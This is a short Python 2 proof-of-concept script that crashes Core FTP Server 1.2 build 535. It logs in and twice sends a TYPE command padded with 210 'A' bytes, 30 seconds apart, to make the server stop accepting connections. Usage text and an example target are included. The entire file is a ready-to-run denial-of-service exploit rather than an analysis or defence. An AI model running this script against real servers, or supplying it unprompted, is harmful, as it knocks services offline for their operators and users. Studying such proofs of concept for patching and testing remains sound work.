#!/usr/bin/python

import socket,sys,time

def Usage():
        print ("Core FTP Server Version 1.2, build 535, 32-bit - Crash P.O.C.")
        print ("Usage: ./coreftp_dos.py <host> <port> <username> <password>")
        print ("Ex:    ./coreftp_dos.py 192.168.10.10 21 ftp ftp\n")

if len(sys.argv) <> 5:
        Usage()
        sys.exit(1)
else:
        host=sys.argv[1]
        port=sys.argv[2]
        user=sys.argv[3]
        passwd=sys.argv[4]
        evil = '\x41' * 210
        print "[+] Trying to crash Core FTP server with " + str(len(evil)) + " buffer bytes"
        print "[+] Host: " + host + " Port: " + port + " User: " + user + " Pass: " + passwd
        print "[+] Attempting to connect to the remote Core FTP Server..."
        first = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        port=int(port)
        try:
                connect = first.connect((host, port))
        except:
                print "[-] There was an error while trying to connect to the remote FTP Server"
                sys.exit(1)
        print "[+] Connection to remote server successfully... now trying to authenticate"
        first.recv(1024)
        first.send('USER ' + user + '\r\n')
        first.recv(1024)
        first.send('PASS ' + passwd + '\r\n')
        first.recv(1024)
        first.send('dir\r\n');
        first.send('TYPE ' + evil + '\r\n')
        try:
                first.recv(1024)
        except:
                print "[-] Couldn\'t authenticate in the remote FTP server"
                sys.exit(1)
        print "[+] First buffer was sent, waiting 30 seconds to send a second time with some more bad data..."
        first.close()
        second = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        time.sleep(30)
        try:
                connect = second.connect((host, port))
        except:
                print "[-] FTP Server isn\'t responding... it might had successfully crashed."
                sys.exit(1)
        second.send('USER ' + user + '\r\n')
        second.recv(1024)
        second.send('PASS ' + passwd + '\r\n')
        second.recv(1024)
        second.send('TYPE ' + evil + '\r\n')
        second.recv(1024)
        print "[+] By now, Core FTP Server should had crashed and will not accept new connections."
        second.close()
        sys.exit(0)